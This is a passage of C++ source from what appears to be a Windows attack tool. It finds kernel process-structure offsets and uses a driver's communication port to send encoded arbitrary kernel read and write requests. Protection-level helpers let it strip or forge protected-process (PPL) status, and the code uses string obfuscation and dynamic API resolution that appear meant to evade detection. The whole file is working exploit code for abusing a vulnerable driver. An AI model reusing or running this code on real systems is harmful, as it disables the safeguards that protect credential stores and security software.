    DWORD ee = GetLastError();
    if(_KernelModule == NULL) g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::OffsetFinder() LoadLibraryW(ntoskrnl.exe)[%d]: %s\n"), ee, Win32ErrorToStringW(ee).c_str());
}

OffsetFinder::~OffsetFinder()
{
    if (_KernelModule)
        dynapi::pFreeLibrary(_KernelModule);
}

DWORD OffsetFinder::GetOffset(Offset Name)
{
    return _OffsetMap[Name];
}

BOOL OffsetFinder::FindAllOffsets()
{
    if (!FindKernelPsInitialSystemProcessOffset())
        return FALSE;

    if (!FindProcessUniqueProcessIdOffset())
        return FALSE;

    if (!FindProcessProtectionOffset())
        return FALSE;

    if (!FindProcessActiveProcessLinksOffset())
        return FALSE;

    if (!FindProcessSignatureLevelOffset())
        return FALSE;

    if (!FindProcessSectionSignatureLevelOffset())
        return FALSE;

    return TRUE;
}

BOOL OffsetFinder::FindKernelPsInitialSystemProcessOffset()
{
    ULONG_PTR pPsInitialSystemProcess;
    DWORD dwPsInitialSystemProcessOffset;

    if (_OffsetMap.find(Offset::KernelPsInitialSystemProcess) != _OffsetMap.end())
        return TRUE;

    if (!(pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(_KernelModule, SKA("PsInitialSystemProcess"))))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindKernelPsInitialSystemProcessOffset() The procedure '%ws' was not found.\n"), SKW(L"PsInitialSystemProcess"));
        return FALSE;
    }

    g_log.Printf(LogLevel::Debug, SKW(L"[D] %ws @ 0x%016llx\n"), SKW(L"PsInitialSystemProcess"), (DWORD64)pPsInitialSystemProcess);

    dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)_KernelModule);

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Offset: 0x%08x\n"), dwPsInitialSystemProcessOffset);

    _OffsetMap.insert(std::make_pair(Offset::KernelPsInitialSystemProcess, dwPsInitialSystemProcessOffset));

    return TRUE;
}

BOOL OffsetFinder::FindProcessActiveProcessLinksOffset()
{
    WORD wActiveProcessLinks;

    if (_OffsetMap.find(Offset::ProcessActiveProcessLinks) != _OffsetMap.end())
        return TRUE;

    if (_OffsetMap.find(Offset::ProcessUniqueProcessId) == _OffsetMap.end())
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessActiveProcessLinksOffset() The offset 'UniqueProcessId' is not defined.\n"));
        return FALSE;
    }

    wActiveProcessLinks = (WORD)_OffsetMap[Offset::ProcessUniqueProcessId] + sizeof(HANDLE);

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Offset: 0x%04x\n"), wActiveProcessLinks);

    _OffsetMap.insert(std::make_pair(Offset::ProcessActiveProcessLinks, wActiveProcessLinks));

    return TRUE;
}

BOOL OffsetFinder::FindProcessUniqueProcessIdOffset()
{
    FARPROC pPsGetProcessId;
    WORD wUniqueProcessIdOffset;

    if (_OffsetMap.find(Offset::ProcessUniqueProcessId) != _OffsetMap.end())
        return TRUE;

    if (!(pPsGetProcessId = GetProcAddress(_KernelModule, SKA("PsGetProcessId"))))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessUniqueProcessIdOffset() The procedure '%ws' was not found\n"), SKW(L"PsGetProcessId"));
        return FALSE;
    }

    g_log.Printf(LogLevel::Debug, SKW(L"[D] %ws @ 0x%016llx\n"), SKW(L"PsGetProcessId"), (DWORD64)pPsGetProcessId);

#ifdef _WIN64
    memcpy_s(&wUniqueProcessIdOffset, sizeof(wUniqueProcessIdOffset), (PVOID)((ULONG_PTR)pPsGetProcessId + 3), sizeof(wUniqueProcessIdOffset));
#else
    memcpy_s(&wUniqueProcessIdOffset, sizeof(wUniqueProcessIdOffset), (PVOID)((ULONG_PTR)pPsGetProcessId + 2), sizeof(wUniqueProcessIdOffset));
#endif

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Offset: 0x%04x\n"), wUniqueProcessIdOffset);

    if (wUniqueProcessIdOffset > 0x0fff)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessUniqueProcessIdOffset() The offset value of 'UniqueProcessId' is greater than the maximum allowed (0x%04x).\n"), wUniqueProcessIdOffset);
        return FALSE;
    }

    _OffsetMap.insert(std::make_pair(Offset::ProcessUniqueProcessId, wUniqueProcessIdOffset));

    return TRUE;
}

BOOL OffsetFinder::FindProcessProtectionOffset()
{
    FARPROC pPsIsProtectedProcess, pPsIsProtectedProcessLight;
    WORD wProtectionOffsetA, wProtectionOffsetB;

    if (_OffsetMap.find(Offset::ProcessProtection) != _OffsetMap.end())
        return TRUE;

    if (!(pPsIsProtectedProcess = GetProcAddress(_KernelModule, SKA("PsIsProtectedProcess"))))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessProtectionOffset() The procedure '%ws' was not found\n"), SKW(L"PsIsProtectedProcess"));
        return FALSE;
    }

    g_log.Printf(LogLevel::Debug, SKW(L"[D] %ws @ 0x%016llx\n"), SKW(L"PsIsProtectedProcess"), (DWORD64)pPsIsProtectedProcess);

    if (!(pPsIsProtectedProcessLight = GetProcAddress(_KernelModule, SKA("PsIsProtectedProcessLight"))))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessProtectionOffset() The procedure '%ws' was not found\n"), SKW(L"PsIsProtectedProcessLight"));
        return FALSE;
    }

    g_log.Printf(LogLevel::Debug, SKW(L"[D] %ws @ 0x%016llx\n"), SKW(L"PsIsProtectedProcessLight"), (DWORD64)pPsIsProtectedProcessLight);

    memcpy_s(&wProtectionOffsetA, sizeof(wProtectionOffsetA), (PVOID)((ULONG_PTR)pPsIsProtectedProcess + 2), sizeof(wProtectionOffsetA));
    memcpy_s(&wProtectionOffsetB, sizeof(wProtectionOffsetB), (PVOID)((ULONG_PTR)pPsIsProtectedProcessLight + 2), sizeof(wProtectionOffsetB));

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Offset in %ws: 0x%04x | Offset in %ws: 0x%04x\n"), SKW(L"PsIsProtectedProcess"), wProtectionOffsetA, SKW(L"PsIsProtectedProcessLight"), wProtectionOffsetB);

    if (wProtectionOffsetA != wProtectionOffsetB || wProtectionOffsetA > 0x0fff)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessProtectionOffset() The offset value of 'Protection' is inconsistent or is greater than the maximum allowed (0x%04x / 0x%04x)\n"), wProtectionOffsetA, wProtectionOffsetB);
        return FALSE;
    }

    _OffsetMap.insert(std::make_pair(Offset::ProcessProtection, wProtectionOffsetA));

    return TRUE;
}

BOOL OffsetFinder::FindProcessSignatureLevelOffset()
{
    WORD wSignatureLevel;

    if (_OffsetMap.find(Offset::ProcessSignatureLevel) != _OffsetMap.end())
        return TRUE;

    if (_OffsetMap.find(Offset::ProcessProtection) == _OffsetMap.end())
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessSignatureLevelOffset() The offset 'Protection' is not defined.\n"));
        return FALSE;
    }

    wSignatureLevel = (WORD)_OffsetMap[Offset::ProcessProtection] - (2 * sizeof(UCHAR));

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Offset: 0x%04x\n"), wSignatureLevel);

    _OffsetMap.insert(std::make_pair(Offset::ProcessSignatureLevel, wSignatureLevel));

    return TRUE;
}

BOOL OffsetFinder::FindProcessSectionSignatureLevelOffset()
{
    WORD wSectionSignatureLevel;

    if (_OffsetMap.find(Offset::ProcessSectionSignatureLevel) != _OffsetMap.end())
        return TRUE;

    if (_OffsetMap.find(Offset::ProcessProtection) == _OffsetMap.end())
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] OffsetFinder::FindProcessSectionSignatureLevelOffset() The offset 'Protection' is not defined.\n"));
        return FALSE;
    }

    wSectionSignatureLevel = (WORD)_OffsetMap[Offset::ProcessProtection] - sizeof(UCHAR);

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Offset: 0x%04x\n"), wSectionSignatureLevel);

    _OffsetMap.insert(std::make_pair(Offset::ProcessSectionSignatureLevel, wSectionSignatureLevel));

    return TRUE;
}

RTCore::RTCore()
{
    _DeviceName = NULL;
    _DeviceHandle = NULL;
}

RTCore::~RTCore()
{
    if (_DeviceName)
        dynapi::pHeapFree(dynapi::pGetProcessHeap(), 0, _DeviceName);
    if (_DeviceHandle)
        dynapi::pCloseHandle(_DeviceHandle);
}

BOOL RTCore::Read8(ULONG_PTR Address, PBYTE Value)
{
    DWORD dwValue;

    if (!this->Read32(Address, &dwValue))
        return FALSE;

    *Value = dwValue & 0xff;

    return TRUE;
}

BOOL RTCore::Read16(ULONG_PTR Address, PWORD Value)
{
    DWORD dwValue;

    if (!this->Read32(Address, &dwValue))
        return FALSE;

    *Value = dwValue & 0xffff;

    return TRUE;
}

BOOL RTCore::Read32(ULONG_PTR Address, PDWORD Value)
{
    return this->Read(Address, sizeof(*Value), Value);
}

BOOL RTCore::Read64(ULONG_PTR Address, PDWORD64 Value)
{
    DWORD dwLow, dwHigh;

    if (!this->Read32(Address, &dwLow) || !this->Read32(Address + 4, &dwHigh))
        return FALSE;

    *Value = dwHigh;
    *Value = (*Value << 32) | dwLow;

    return TRUE;
}

BOOL RTCore::ReadPtr(ULONG_PTR Address, PULONG_PTR Value)
{
#ifdef _WIN64
    return this->Read64(Address, Value);
#else
    return this->Read32(Address, Value);
#endif
}

BOOL RTCore::Write8(ULONG_PTR Address, BYTE Value)
{
    return this->Write(Address, sizeof(Value), Value);
}

BOOL RTCore::Write16(ULONG_PTR Address, WORD Value)
{
    return this->Write(Address, sizeof(Value), Value);
}

BOOL RTCore::Write32(ULONG_PTR Address, DWORD Value)
{
    return this->Write(Address, sizeof(Value), Value);
}

BOOL RTCore::Write64(ULONG_PTR Address, DWORD64 Value)
{
    DWORD dwLow, dwHigh;

    dwLow = Value & 0xffffffff;
    dwHigh = (Value >> 32) & 0xffffffff;

    return this->Write32(Address, dwLow) && this->Write32(Address + 4, dwHigh);
}

BOOL RTCore::Initialize()
{
    if (_DeviceHandle == NULL)
    {
        hPort = connect_driver();
        if (hPort == INVALID_HANDLE_VALUE) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] RTCore::Initialize() Fail to connect to driver\n"));
            return FALSE;
        }
        _DeviceHandle = hPort;
    }
    
    return TRUE;
}

#include <winternl.h>
BOOL RTCore::Read(ULONG_PTR Address, DWORD ValueSize, PDWORD Value)
{
    if (!this->Initialize()) {
        g_log.Printf(LogLevel::Error,
            SKW(L"[!] RTCore::Read() this->Initialize() Error.\n"));
        return FALSE;
    }

    g_log.Printf(LogLevel::Debug,
        SKW(L"[D] RTCore::Read() Prepare call: kernel_read_data for address 0x%016llx\n"),
        Address);

    const int bufferSize = (sizeof(KERNEL_READ_PACKET) / 16 + 1) * 16;
    BYTE buffer[bufferSize];
    KERNEL_READ_PACKET* packet = (KERNEL_READ_PACKET*)buffer;

    packet->Opcode = 14;
    packet->Src = (PVOID)Address;
    packet->Size = ValueSize;

    encode_payload(Key, buffer, bufferSize);

    DWORD readValue = 0;
    DWORD bytesReturned = 0;

    HRESULT hResult = FilterSendMessage(_DeviceHandle,
        buffer,
        bufferSize,
        &readValue,
        ValueSize,
        &bytesReturned);

    if (hResult != S_OK) {
        g_log.Printf(LogLevel::Error,
            SKW(L"[!] RTCore::Read() FilterSendMessage failed: HRESULT=0x%08X\n"),
            hResult);
        return FALSE;
    }

    
    if (bytesReturned != ValueSize) {
        g_log.Printf(LogLevel::Error,
            SKW(L"[!] RTCore::Read() Incomplete read: expected %lu bytes, got %lu bytes\n"),
            ValueSize, bytesReturned);
        return FALSE;
    }


    *Value = readValue;

    g_log.Printf(LogLevel::Debug,
        SKW(L"[D] RTCore::Read() Success: 0x%016llx -> 0x%08x\n"),
        Address, *Value);

    return TRUE;
}


BOOL RTCore::Write(ULONG_PTR Address, DWORD ValueSize, DWORD Value)
{
    if (!this->Initialize()) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] RTCore::Read() this->Initialize() Error.\n"));
        return FALSE;
    }

    g_log.Printf(LogLevel::Debug,
        SKW(L"[D] RTCore::Write() Writing 0x%08x to address 0x%016llx\n"),
        Value, Address);


    const int bufferSize = (sizeof(KERNEL_WRITE_PACKET) / 16 + 1) * 16;
    BYTE buffer[bufferSize];
    KERNEL_WRITE_PACKET* packet = (KERNEL_WRITE_PACKET*)buffer;

    packet->Opcode = 70;
    packet->Dst = (PVOID)Address;
    packet->Src = &Value;
    packet->Size = ValueSize;

    encode_payload(Key, buffer, bufferSize);

    DWORD bytesReturned = 0;

    HRESULT hResult = FilterSendMessage(hPort,
        buffer,
        bufferSize,
        NULL,
        NULL,
        &bytesReturned);

    if (hResult == S_OK) {
        g_log.Printf(LogLevel::Debug,
            SKW(L"[D] RTCore::Write() Success: wrote 0x%08x to 0x%016llx\n"),
            Value, Address);
        return TRUE;
    }
    else {
        g_log.Printf(LogLevel::Error,
            SKW(L"[!] RTCore::Write() FilterSendMessage failed: HRESULT=0x%08X\n"),
            hResult);
        return FALSE;
    }
}



ULONG_PTR Utils::GetKernelBaseAddress()
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded))
        goto cleanup;

    if (!(lpImageBase = (LPVOID*)dynapi::pHeapAlloc(dynapi::pGetProcessHeap(), 0, dwBytesNeeded)))
        goto cleanup;

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded))
        goto cleanup;

    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];

cleanup:
    if (lpImageBase)
        dynapi::pHeapFree(dynapi::pGetProcessHeap(), 0, lpImageBase);

    return pKernelBaseAddress;
}

ULONG_PTR Utils::GetKernelAddress(ULONG_PTR Base, DWORD Offset)
{
    return Base + Offset;
}

UCHAR Utils::GetProtectionLevel(UCHAR Protection)
{
    return Protection & 0x07;
}

UCHAR Utils::GetSignerType(UCHAR Protection)
{
    return (Protection & 0xf0) >> 4;
}

UCHAR Utils::GetProtection(UCHAR ProtectionLevel, UCHAR SignerType)
{
    return ((UCHAR)SignerType << 4) | (UCHAR)ProtectionLevel;
}

LPCWSTR Utils::GetProtectionLevelAsString(UCHAR ProtectionLevel)
{
    switch (ProtectionLevel)
    {
    case PsProtectedTypeNone:
        return SKW(L"None");
    case PsProtectedTypeProtectedLight:
        return SKW(L"PPL");
    case PsProtectedTypeProtected:
        return SKW(L"PP");
    }

    //g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetProtectionLevelAsString() Failed to retrieve the Protection level associated to the value %d.\n"), ProtectionLevel);

    return SKW(L"Unknown");
}

LPCWSTR Utils::GetSignerTypeAsString(UCHAR SignerType)
{
    switch (SignerType)
    {
    case PsProtectedSignerNone:
        return SKW(L"None");
    case PsProtectedSignerAuthenticode:
        return SKW(L"Authenticode");
    case PsProtectedSignerCodeGen:
        return SKW(L"CodeGen");
    case PsProtectedSignerAntimalware:
        return SKW(L"Antimalware");
    case PsProtectedSignerLsa:
        return SKW(L"Lsa");
    case PsProtectedSignerWindows:
        return SKW(L"Windows");
    case PsProtectedSignerWinTcb:
        return SKW(L"WinTcb");
    case PsProtectedSignerWinSystem:
        return SKW(L"WinSystem");
    case PsProtectedSignerApp:
        return SKW(L"App");
    }

    //g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetSignerTypeAsString() Failed to retrieve the Signer type associated to the value %d.\n"), SignerType);

    return SKW(L"Unknown");
}

UCHAR Utils::GetProtectionLevelFromString(LPCWSTR ProtectionLevel)
{
    if (ProtectionLevel)
    {
        if (!_wcsicmp(ProtectionLevel, SKW(L"PP")))
            return PsProtectedTypeProtected;
        else if (!_wcsicmp(ProtectionLevel, SKW(L"PPL")))
            return PsProtectedTypeProtectedLight;
    }

    g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetProtectionLevelFromString() Failed to retrieve the value of the Protection level '%ws'.\n"), ProtectionLevel);

    return 0;
}

UCHAR Utils::GetSignerTypeFromString(LPCWSTR SignerType)
{
    if (SignerType)
    {
        if (!_wcsicmp(SignerType, SKW(L"Authenticode")))
            return PsProtectedSignerAuthenticode;
        else if (!_wcsicmp(SignerType, SKW(L"CodeGen")))
            return PsProtectedSignerCodeGen;
        else if (!_wcsicmp(SignerType, SKW(L"Antimalware")))
            return PsProtectedSignerAntimalware;
        else if (!_wcsicmp(SignerType, SKW(L"Lsa")))
            return PsProtectedSignerLsa;
        else if (!_wcsicmp(SignerType, SKW(L"Windows")))
            return PsProtectedSignerWindows;
        else if (!_wcsicmp(SignerType, SKW(L"WinTcb")))
            return PsProtectedSignerWinTcb;
        else if (!_wcsicmp(SignerType, SKW(L"WinSystem")))
            return PsProtectedSignerWinSystem;
        else if (!_wcsicmp(SignerType, SKW(L"App")))
            return PsProtectedSignerApp;
    }

    //g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetSignerTypeFromString() Failed to retrieve the value of the Signer type '%ws'.\n"), SignerType);

    return 0;
}

UCHAR Utils::GetSignatureLevel(UCHAR SignerType)
{
    switch (SignerType)
    {
    case PsProtectedSignerNone:
        return SE_SIGNING_LEVEL_UNCHECKED;
    case PsProtectedSignerAuthenticode:
        return SE_SIGNING_LEVEL_AUTHENTICODE;
    case PsProtectedSignerCodeGen:
        return SE_SIGNING_LEVEL_DYNAMIC_CODEGEN;
    case PsProtectedSignerAntimalware:
        return SE_SIGNING_LEVEL_ANTIMALWARE;
    case PsProtectedSignerLsa:
        return SE_SIGNING_LEVEL_WINDOWS;
    case PsProtectedSignerWindows:
        return SE_SIGNING_LEVEL_WINDOWS;
    case PsProtectedSignerWinTcb:
        return SE_SIGNING_LEVEL_WINDOWS_TCB;
    }

    //g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetSignatureLevel() Failed to retrieve the Signature level associated to the Signer type value %d.\n"), SignerType);

    return 0xff;
}

UCHAR Utils::GetSectionSignatureLevel(UCHAR SignerType)
{
    /*
    PsProtectedSignerNone = 0,      // 0
	PsProtectedSignerAuthenticode,  // 1
	PsProtectedSignerCodeGen,       // 2
	PsProtectedSignerAntimalware,   // 3
	PsProtectedSignerLsa,           // 4
	PsProtectedSignerWindows,       // 5
	PsProtectedSignerWinTcb,        // 6
	PsProtectedSignerWinSystem,     // 7
	PsProtectedSignerApp,           // 8
	PsProtectedSignerMax            // 9

    #define SE_SIGNING_LEVEL_UNCHECKED         0x00000000
    #define SE_SIGNING_LEVEL_UNSIGNED          0x00000001
    #define SE_SIGNING_LEVEL_ENTERPRISE        0x00000002
    #define SE_SIGNING_LEVEL_CUSTOM_1          0x00000003
    #define SE_SIGNING_LEVEL_DEVELOPER         SE_SIGNING_LEVEL_CUSTOM_1
    #define SE_SIGNING_LEVEL_AUTHENTICODE      0x00000004
    #define SE_SIGNING_LEVEL_CUSTOM_2          0x00000005
    #define SE_SIGNING_LEVEL_STORE             0x00000006
    #define SE_SIGNING_LEVEL_CUSTOM_3          0x00000007
    #define SE_SIGNING_LEVEL_ANTIMALWARE       SE_SIGNING_LEVEL_CUSTOM_3
    #define SE_SIGNING_LEVEL_MICROSOFT         0x00000008
    #define SE_SIGNING_LEVEL_CUSTOM_4          0x00000009
    #define SE_SIGNING_LEVEL_CUSTOM_5          0x0000000A
    #define SE_SIGNING_LEVEL_DYNAMIC_CODEGEN   0x0000000B
    #define SE_SIGNING_LEVEL_WINDOWS           0x0000000C
    #define SE_SIGNING_LEVEL_CUSTOM_7          0x0000000D
    #define SE_SIGNING_LEVEL_WINDOWS_TCB       0x0000000E
    #define SE_SIGNING_LEVEL_CUSTOM_6          0x0000000F
    */

    switch (SignerType)
    {
    case PsProtectedSignerNone:
        return SE_SIGNING_LEVEL_UNCHECKED;
    case PsProtectedSignerAuthenticode:
        return SE_SIGNING_LEVEL_AUTHENTICODE;
    case PsProtectedSignerCodeGen:
        return SE_SIGNING_LEVEL_STORE;
    case PsProtectedSignerAntimalware:
        return SE_SIGNING_LEVEL_ANTIMALWARE;
    case PsProtectedSignerLsa:
        return SE_SIGNING_LEVEL_MICROSOFT;
    case PsProtectedSignerWindows:
        return SE_SIGNING_LEVEL_WINDOWS;
    case PsProtectedSignerWinTcb:
        return SE_SIGNING_LEVEL_WINDOWS_TCB;
    case PsProtectedSignerWinSystem:
        return SE_SIGNING_LEVEL_WINDOWS; // Section signature level is actually 'Windows' in this case.
    }

    //g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetSectionSignatureLevel() Failed to retrieve the Section signature level associated to the Signer type value %d.\n"), SignerType);

    return 0xff;
}

LPCWSTR Utils::GetSignatureLevelAsString(UCHAR SignatureLevel)
{
    UCHAR bSignatureLevel;

    bSignatureLevel = SignatureLevel & 0x0f; // Remove additional flags
 
    switch (bSignatureLevel)
    {
        case SE_SIGNING_LEVEL_UNCHECKED:
            return SKW(L"Unchecked");

        case SE_SIGNING_LEVEL_UNSIGNED:
            return SKW(L"Unsigned");

        case SE_SIGNING_LEVEL_ENTERPRISE:
            return SKW(L"Enterprise");

        case SE_SIGNING_LEVEL_DEVELOPER:
            return SKW(L"Developer");

        case SE_SIGNING_LEVEL_AUTHENTICODE:
            return SKW(L"Authenticode");

        case SE_SIGNING_LEVEL_CUSTOM_2:
            return SKW(L"Custom2");

        case SE_SIGNING_LEVEL_STORE:
            return SKW(L"Store");

        case SE_SIGNING_LEVEL_ANTIMALWARE:
            return SKW(L"Antimalware");

        case SE_SIGNING_LEVEL_MICROSOFT:
            return SKW(L"Microsoft");

        case SE_SIGNING_LEVEL_CUSTOM_4:
            return SKW(L"Custom4");

        case SE_SIGNING_LEVEL_CUSTOM_5:
            return SKW(L"Custom5");

        case SE_SIGNING_LEVEL_DYNAMIC_CODEGEN:
            return SKW(L"DynamicCodegen");

        case SE_SIGNING_LEVEL_WINDOWS:
            return SKW(L"Windows");

        case SE_SIGNING_LEVEL_CUSTOM_7:
            return SKW(L"Custom7");

        case SE_SIGNING_LEVEL_WINDOWS_TCB:
            return SKW(L"WindowsTcb");

        case SE_SIGNING_LEVEL_CUSTOM_6:
            return SKW(L"Custom6");
    }

    //g_log.Printf(LogLevel::Error, SKW(L"[!] Utils::GetSignatureLevelAsString() Failed to retrieve the Signature level associated to the value 0x%02x.\n"), SignatureLevel);

    return SKW(L"Unknown");
}


bool SafeCloseHandle(HANDLE* ph, DWORD* outLastError /*=nullptr*/)
{
    if (outLastError) *outLastError = ERROR_SUCCESS;

    if (!ph)
    {
        if (outLastError) *outLastError = ERROR_INVALID_PARAMETER;
        return false;
    }

    HANDLE h = *ph;


    if (h == nullptr || h == INVALID_HANDLE_VALUE)
    {
        *ph = nullptr;
        return true;
    }


    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32)
    {
        if (outLastError) *outLastError = ERROR_PROC_NOT_FOUND;
        return false;
    }

    auto pGetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))
        GetProcAddress(hK32, SKA("GetProcAddress"));
    if (!pGetProcAddress)
    {
        if (outLastError) *outLastError = ERROR_PROC_NOT_FOUND;
        return false;
    }

    auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))
        (void*)pGetProcAddress(hK32, SKA("CloseHandle"));

    auto pGetLastError = (DWORD(WINAPI*)())
        (void*)pGetProcAddress(hK32, SKA("GetLastError"));

    if (!pCloseHandle || !pGetLastError)
    {
        if (outLastError) *outLastError = ERROR_PROC_NOT_FOUND;
        return false;
    }

    BOOL ok = pCloseHandle(h);
    if (!ok)
    {
        DWORD gle = pGetLastError();
        if (outLastError) *outLastError = gle;

        return false;
    }


    *ph = nullptr;
    return true;
}
